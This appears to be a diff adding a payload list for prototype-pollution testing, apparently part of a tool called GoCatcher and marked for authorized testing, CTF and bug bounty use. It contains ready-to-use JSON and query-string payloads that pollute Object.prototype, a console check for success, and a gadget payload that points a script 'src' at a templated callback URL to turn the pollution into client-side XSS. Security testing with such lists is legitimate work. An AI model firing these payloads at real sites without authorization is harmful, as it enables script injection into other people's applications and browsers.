@@ -1,0 +1,17 @@
+===========================================================================
+ GoCatcher :: Prototype Pollution test payloads  (text/plain)
+ FOR AUTHORIZED TESTING / CTF / BUG BOUNTY ONLY.
+===========================================================================
+# JSON body:
+{"__proto__":{"polluted":"yes"}}
+{"constructor":{"prototype":{"polluted":"yes"}}}
+
+# Query / form:
+?__proto__[polluted]=yes
+?constructor[prototype][polluted]=yes
+
+# Detection in console:
+Object.prototype.polluted   // -> "yes" if vulnerable
+
+# Gadget -> client XSS callback:
+{"__proto__":{"src":"{{callback_url}}/pp"}}
